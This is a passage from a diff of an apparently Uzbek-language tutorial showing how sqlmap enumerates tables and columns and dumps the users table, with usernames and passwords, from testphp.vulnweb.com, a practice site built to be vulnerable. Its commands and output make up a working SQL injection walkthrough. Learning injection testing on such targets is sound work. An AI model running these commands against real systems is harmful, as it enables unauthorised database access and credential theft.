@@ -15,15 +15,22 @@ information_schema
 ```
 sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
 ```
-Database: acuart
-(8 tables)
-+-----------+
-| artists   |
-| carts     |
-| categ     |
-| featured  |
-| guestbook |
-| pictures  |
-| products  |
-| users     |
-+-----------+
+Database: acuart  
+(8 tables)   
+.......  
+users  
+
+3. Muayyan jadvaldagi ustunlarni chiqarish:
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+```
+name  
+pass  
+uname  
+
+4. Ma'lumotlarni chiqarish (dump):
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C name,uname,pass --dump
+```  
+| name         | uname | pass | 
+| John M Smith | test  | test |
